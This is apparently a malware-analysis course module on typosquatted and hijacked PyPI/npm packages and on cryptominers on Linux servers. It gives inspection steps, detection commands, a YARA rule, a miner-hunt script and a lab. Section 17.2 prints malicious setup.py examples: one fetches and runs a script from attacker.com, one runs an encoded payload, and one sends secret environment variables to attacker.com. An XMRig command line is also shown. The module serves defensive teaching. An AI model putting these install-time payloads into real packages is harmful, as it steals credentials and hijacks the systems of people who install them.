# Module 17 — Supply Chain Attacks & Cryptominer Malware

**Prerequisites:** Modules 02 (Static Analysis), 03 (Dynamic Analysis), 14 (Fileless Malware)  
**Estimated time:** 3–4 hours  
**Tools:** pip3, npm, python3, strace, strings, auditd  
**Difficulty:** Intermediate

---

## Overview

Two threats that the course hasn't covered in depth, both common, both frequently underestimated by defenders who focus on traditional endpoint malware.

Supply chain attacks hit the software you trust. Cryptominers are the most common payload you'll actually find on a compromised server. Neither requires sophisticated exploitation — the attacker relies on you installing a package without inspection, or leaving a port open without monitoring. Understanding them closes real gaps.

---

## 17.1 Supply Chain Attacks — The Trusted Package Problem

The attack surface here is the package installation command itself. When a developer or sysadmin runs `pip3 install requests` or `npm install axios`, they trust the package registry to serve them exactly what they expect. That trust is routinely abused.

### Three Attack Patterns

**Typosquatting**

Publish a malicious package with a name one character different from a popular one.

```
requests    → requesst, request, requuests
colorama    → colourama, coloorama
boto3       → botto3, b0to3
```

The attacker's package installs the legitimate one as a dependency (so nothing visually breaks) and runs additional code. Developers making typos install the malicious version.

**Dependency Confusion**

If an organisation uses a private package registry for internal packages, attackers publish a package with the same name to the public registry at a higher version number. Some configurations resolve public registries first. Internal package `company-auth` becomes shadowed by `company-auth` on PyPI with version 99.0.0.

**Account Takeover / Maintainer Compromise**

Legitimate package maintainer's PyPI or npm account is compromised. Attacker pushes a new version of a real, trusted package with malicious code inserted. Millions of users auto-update and install it.

**Real impact example:** `event-stream` (2018) — 8 million weekly npm downloads. A maintainer transferred ownership to an unknown account which inserted a Bitcoin wallet stealer targeting one specific company. The malicious code ran only on CI/CD systems matching a specific configuration, making it nearly invisible.

---

## 17.2 Analysing a Suspicious Package Before Installing

Never `pip install` an unfamiliar package directly on a production system or your analysis machine. The installation itself can be the attack.

```bash
# Step 1: Download without installing
pip3 download suspicious-package --no-deps -d /tmp/pkg_inspect/
ls /tmp/pkg_inspect/

# Step 2: Inspect the contents without extracting
# Wheels are ZIP files
unzip -l /tmp/pkg_inspect/*.whl 2>/dev/null | head -30
# Source distributions are tar.gz
tar -tzf /tmp/pkg_inspect/*.tar.gz 2>/dev/null | head -30

# Step 3: Extract and read setup.py BEFORE installing
mkdir -p /tmp/pkg_contents
cd /tmp/pkg_contents
tar -xzf /tmp/pkg_inspect/*.tar.gz 2>/dev/null || unzip /tmp/pkg_inspect/*.whl 2>/dev/null
cat */setup.py 2>/dev/null
cat */setup.cfg 2>/dev/null

# Step 4: String analysis for IOCs
find /tmp/pkg_contents -name "*.py" | xargs strings 2>/dev/null | \
  grep -iE "http://|https://|socket|subprocess|os\.system|exec\(|base64|__import__|eval\(" | \
  grep -v "# " | head -20

# Step 5: Look for network calls in setup.py specifically
grep -r "urllib\|requests\|socket\|subprocess\|os\.system\|exec\|eval\|__import__" \
  /tmp/pkg_contents/*/setup.py 2>/dev/null
```

### What Malicious setup.py Looks Like

A legitimate `setup.py` configures package metadata and dependencies. A malicious one adds code that runs on install:

```python
# Malicious setup.py pattern 1 — direct network call
from setuptools import setup
import urllib.request, os

# This runs on pip install:
urllib.request.urlretrieve(
    "http://attacker.com/payload.sh",
    "/tmp/.sys_update"
)
os.system("bash /tmp/.sys_update")

setup(name="requesst", version="2.28.2", ...)
```

```python
# Malicious setup.py pattern 2 — encoded payload
from setuptools import setup
import base64, subprocess

subprocess.run(
    ["python3", "-c",
     base64.b64decode("aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcyAuLi4=").decode()
    ]
)
setup(name="colourama", version="0.4.4", ...)
```

```python
# Malicious setup.py pattern 3 — environment exfiltration
from setuptools import setup
import os, urllib.request, json

data = {k: v for k, v in os.environ.items()
        if any(x in k for x in ["SECRET","TOKEN","KEY","PASS","AWS","API"])}
if data:
    urllib.request.urlopen(
        "http://attacker.com/collect",
        data=json.dumps(data).encode()
    )
setup(name="b0to3", version="1.26.0", ...)
```

Pattern 3 is common in supply chain attacks targeting CI/CD environments — the `os.environ` on a CI runner contains AWS keys, deployment credentials and API tokens.

---

## 17.3 Building a Safe Demo

```bash
# Create a safe "malicious" package structure for analysis practice
mkdir -p /tmp/fake_pkg/safe_requesst
cat > /tmp/fake_pkg/setup.py << 'EOF'
from setuptools import setup
import os, socket

# This would be the malicious code in a real attack:
print(f"[SUPPLY_CHAIN_DEMO] Running on: {socket.gethostname()}")
print(f"[SUPPLY_CHAIN_DEMO] User: {os.getenv('USER', 'unknown')}")
print(f"[SUPPLY_CHAIN_DEMO] Would exfiltrate: AWS_ACCESS_KEY_ID, GITHUB_TOKEN, etc.")
print(f"[SUPPLY_CHAIN_DEMO] FLAG: FLAG{{supply_chain_setup_py_runs_on_install}}")

# Real package setup (harmless)
setup(
    name="safe_requesst",
    version="2.28.2",
    description="Legitimate-looking but safe demo",
    install_requires=["requests"],
)
EOF

# Now demonstrate detection workflow:
echo "=== Supply chain detection demo ==="
echo ""
echo "Step 1: Would install 'safe_requesst' — instead inspect first:"
grep -E "import|subprocess|socket|os\." /tmp/fake_pkg/setup.py | head -10

echo ""
echo "Step 2: Any network or execution calls?"
grep -E "urllib|socket|subprocess|os\.system|exec\(" /tmp/fake_pkg/setup.py

echo ""
echo "Step 3: What does the code actually do?"
python3 /tmp/fake_pkg/setup.py --version 2>/dev/null || python3 /tmp/fake_pkg/setup.py
```

---

## 17.4 Cryptominer Malware — The Most Common Server Threat

If you run a public-facing Ubuntu server — a VPS, a local server with a forwarded port, a CTF platform — and it gets compromised, the first payload is almost always a cryptominer. Not ransomware. Not a RAT. A miner.

The economics: ransomware requires human coordination and carries legal risk. A miner runs silently, generates revenue indefinitely, and costs the attacker nothing after deployment. Millions of compromised servers mine Monero (XMR) for botnets like 8220 Gang, TeamTNT and Kinsing.

### What a Miner Looks Like

The most common: XMRig, an open-source Monero miner that threat actors download and run with their wallet configured.

```bash
# XMRig command line — this is what you find in cron or systemd after compromise
xmrig -o pool.minexmr.com:4444 -u WALLET_ADDRESS -p x --tls --no-cpu-profile

# Or hidden behind innocuous names:
# /tmp/.cache/kworker  (impersonating kernel worker)
# /usr/local/bin/system_update
# /dev/shm/java (common disguise)
```

### Detection Signatures

**CPU usage:** A miner consumes 60–100% of available CPU indefinitely. On a server that should be idle or lightly loaded:

```bash
# Top CPU consumers
top -bn1 | grep -v "^top\|^Tasks\|^%\|^MiB\|^$" | head -10

# Any process consistently above 50% CPU
ps aux --sort=-%cpu | head -10

# Check if it's throttling to evade detection
cat /proc/$(pgrep xmrig 2>/dev/null || echo 1)/status 2>/dev/null | grep -i cpu
```

**Network to mining pools:**

```bash
# Common mining pool ports: 3333, 4444, 5555, 7777, 14444, 45560
ss -tnp | grep -E ":3333|:4444|:5555|:7777|:14444|:45560"

# Mining pool domain patterns
ss -tnp | grep ESTAB | awk '{print $5}' | \
  while read addr; do
    host "$addr" 2>/dev/null | grep -iE "mine|pool|xmr|monero|hashrate"
  done
```

**Binary indicators:**

```bash
# String patterns in an unknown binary that suggest miner
strings suspicious_binary | grep -iE \
  "xmrig|monero|hashrate|stratum|mining_pool|donate.*pool|nicehash|cryptonight"

# Config file hunting (miners store wallet address somewhere)
strings suspicious_binary | grep -E "[a-zA-Z0-9]{95,106}"
# Monero wallet addresses are 95-106 characters

# XMRig specific
strings suspicious_binary | grep -iE "algo|cpu-priority|max-cpu|threads|randomx"
```

**Persistence mechanisms miners use:**

```bash
# 1. Cron (most common)
crontab -l 2>/dev/null | grep -iE "xmrig|miner|.cache|/dev/shm|kworker"

# 2. Systemd service
find /etc/systemd /usr/lib/systemd -name "*.service" 2>/dev/null | \
  xargs grep -l "xmrig\|miner\|kworker\|dev.shm" 2>/dev/null

# 3. /etc/rc.local
grep -E "xmrig|miner|/dev/shm|/tmp/\." /etc/rc.local 2>/dev/null

# 4. LD_PRELOAD rootkit (miners sometimes hide themselves)
cat /etc/ld.so.preload 2>/dev/null
```

### YARA Rule for Cryptominer Detection

```yara
rule Cryptominer_Generic_Linux {
    meta:
        description = "Detects common cryptominer indicators on Linux"
        author      = "Course module 17"
        mitre_att   = "T1496 — Resource Hijacking"
    strings:
        $s1 = "xmrig" ascii nocase
        $s2 = "stratum+tcp" ascii
        $s3 = "cryptonight" ascii nocase
        $s4 = "hashrate" ascii nocase
        $s5 = "donate-level" ascii
        $s6 = "mining_pool" ascii nocase
        $pool1 = "minexmr.com" ascii
        $pool2 = "supportxmr.com" ascii
        $pool3 = "pool.hashvault.pro" ascii
        $pool4 = "xmrpool.eu" ascii
        // Monero wallet address pattern (95-106 hex+base58 chars)
        $wallet = /[48][0-9A-Za-z]{93,105}/ ascii
    condition:
        uint32(0) == 0x464c457f and     // ELF
        (
            2 of ($s1, $s2, $s3, $s4, $s5, $s6) or
            1 of ($pool1, $pool2, $pool3, $pool4) or
            ($wallet and 1 of ($s1, $s2, $s3, $s4))
        )
}
```

---

## 17.5 Incident: Finding a Miner After the Fact

Scenario: you log into a server and notice it's sluggish. No obvious new files. How do you find the miner?

```bash
#!/bin/bash
# miner_hunt.sh — Find and profile an active cryptominer

echo "=== Cryptominer Hunt ==="

echo ""
echo "-- Top CPU processes --"
ps aux --sort=-%cpu | head -8

echo ""
echo "-- Processes with high CPU, unusual names --"
ps aux --sort=-%cpu | awk '$3 > 40 {print $2, $3, $11}' | \
  while read pid cpu cmd; do
    echo "  PID $pid ($cpu% CPU): $cmd"
    echo "    EXE: $(readlink -f /proc/$pid/exe 2>/dev/null)"
    echo "    CWD: $(readlink -f /proc/$pid/cwd 2>/dev/null)"
    echo "    Parent: $(ps -o ppid= -p $pid 2>/dev/null | xargs -I{} ps -o comm= -p {} 2>/dev/null)"
  done

echo ""
echo "-- Network connections on mining ports --"
ss -tnp | grep -E ":3333|:4444|:5555|:7777|:14444|:45560" || echo "  (none on known mining ports)"

echo ""
echo "-- Mining pool domains in active connections --"
ss -tnp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort -u | \
  while read ip; do
    host "$ip" 2>/dev/null | grep -iE "mine|pool|xmr|monero|hash" | \
      while read result; do echo "  $ip: $result"; done
  done

echo ""
echo "-- Strings in top CPU process binary --"
TOP_PID=$(ps aux --sort=-%cpu | awk 'NR==2{print $2}')
EXE=$(readlink -f /proc/$TOP_PID/exe 2>/dev/null)
if [ -n "$EXE" ] && [ -f "$EXE" ]; then
    strings "$EXE" | grep -iE "xmrig|stratum|hashrate|monero|cryptonight|donate" | head -5
fi

echo ""
echo "-- Persistence check --"
crontab -l 2>/dev/null | grep -iE "xmrig|miner|kworker|/dev/shm|/tmp/\."
find /etc/systemd /usr/lib/systemd -name "*.service" 2>/dev/null | \
  xargs grep -l "xmrig\|/dev/shm\|kworker" 2>/dev/null

echo ""
echo "=== Hunt complete ==="
```

---

## 17.6 ATT&CK Mapping

| Technique | ID | Supply chain or miner |
|---|---|---|
| Supply Chain Compromise: Software Dependencies | T1195.001 | Malicious npm/PyPI package |
| Command and Scripting Interpreter: Python | T1059.006 | Malicious setup.py execution |
| Credential Access: Unsecured Credentials | T1552 | setup.py reading os.environ |
| Resource Hijacking | T1496 | Cryptominer CPU/GPU theft |
| Scheduled Task/Job: Cron | T1053.003 | Miner cron persistence |
| Masquerading | T1036 | kworker, java, system_update disguise |
| Rootkit | T1014 | LD_PRELOAD miner hiding |
| Non-Standard Port | T1571 | Mining pool ports 3333, 4444, 5555 |

---

## 17.7 Lab

### Part A — Supply Chain Package Inspection

Inspect the demo package and document your findings:

```bash
cd /tmp/fake_pkg
echo "=== Inspection ==="
echo "Package name: $(grep 'name=' setup.py | head -1)"
echo "Version: $(grep 'version=' setup.py | head -1)"
echo ""
echo "Suspicious imports:"
grep -E "^import|^from" setup.py | sort -u
echo ""
echo "Network/exec calls in setup.py:"
grep -E "urllib|socket|subprocess|os\.system|exec\(|eval\(" setup.py
echo ""
echo "Verdict: [MALICIOUS / BENIGN]"
echo "Reason: [one sentence]"
```

### Part B — Miner Detection on Your Lab System

```bash
bash miner_hunt.sh | tee ~/labs/lab17_miner_hunt.txt
```

Your lab system has no miner. Document what each section of the output shows on a clean system — this is your baseline. When you run the same script on a compromised system, deviations from this baseline are your indicators.

### Part C — Write the YARA Rule

Extend the `Cryptominer_Generic_Linux` rule with:
- A string matching the mining pool port pattern in TCP connection strings: `stratum+tcp://.*:3333`
- A condition that also matches if the binary impersonates a kernel thread (contains "kworker" or "ksoftirqd" in the binary strings)

---

## 17.8 Challenge

**The Slow Server**

You SSH into a server that a colleague says "has been slow for two weeks." Task: determine in 5 minutes whether a miner is running, and if so, find its wallet address, mining pool and persistence mechanism.

```bash
# Run the miner hunt
bash miner_hunt.sh

# Wallet address extraction from any suspicious binary
SUSPECT_PID=$(ps aux --sort=-%cpu | awk 'NR==2{print $2}')
EXE=$(readlink -f /proc/$SUSPECT_PID/exe 2>/dev/null)
[ -f "$EXE" ] && strings "$EXE" | grep -E "[48][0-9A-Za-z]{93,105}" | head -3

# Flag: if you find the demo setup.py "malicious" code running:
python3 /tmp/fake_pkg/setup.py 2>/dev/null | grep FLAG
```

**Flag:** `FLAG{supply_chain_setup_py_runs_on_install}`

---

## Knowledge Check

1. **`pip install` is running in your CI pipeline and the build logs show a network connection to an IP in Russia during package installation. You didn't configure any such connection. What happened and what do you do?**

   <details>
   <summary>Answer</summary>
   A package in your dependencies (or a typosquatted version of one) contains malicious code in setup.py that runs on installation and makes an outbound connection — likely exfiltrating environment variables including CI secrets. Immediate actions: (1) Halt the build and any deployment from it — assume any secrets in the CI environment are compromised. (2) Rotate all credentials in that environment: API keys, tokens, SSH keys, cloud credentials. (3) Identify which package triggered the connection — check pip install logs for timing and cross-reference with the connection timestamp. (4) Hash the suspicious package and check VirusTotal. (5) Report to the registry (PyPI/npm) so the package is investigated and removed.
   </details>

2. **A server has a process named `kworker` running as root with 85% CPU and a TCP connection to `94.23.x.x:4444`. Real kernel workers never appear in `ss` output. What is your response?**

   <details>
   <summary>Answer</summary>
   This is a cryptominer masquerading as a kernel worker thread. Real kworkers are kernel threads that do not make network connections and do not appear in ss output. Response: (1) Capture the process state before killing it — `ls -la /proc/PID/exe`, `strings /proc/PID/exe`, `lsof -p PID`. (2) Check all persistence locations — cron, systemd, ld.so.preload, rc.local. (3) Extract the wallet address from the binary strings. (4) Kill the miner process. (5) Remove all persistence entries. (6) Determine how the attacker gained initial access — check auth.log, web server logs, last logins. (7) Patch the entry point before bringing the server back online.
   </details>

3. **Why do attackers use Monero (XMR) rather than Bitcoin for mining malware?**

   <details>
   <summary>Answer</summary>
   Three reasons: (1) Monero is CPU-minable — Bitcoin requires specialised ASIC hardware; XMR's RandomX algorithm was specifically designed to be CPU-efficient, making compromised general-purpose servers profitable. (2) Monero transactions are private — unlike Bitcoin, Monero hides sender, receiver and amount by default, making it harder to trace the attacker's wallet. (3) The XMRig miner is open source, well-maintained and configurable — attackers just replace the wallet address and point it at their pool. No custom malware needed.
   </details>
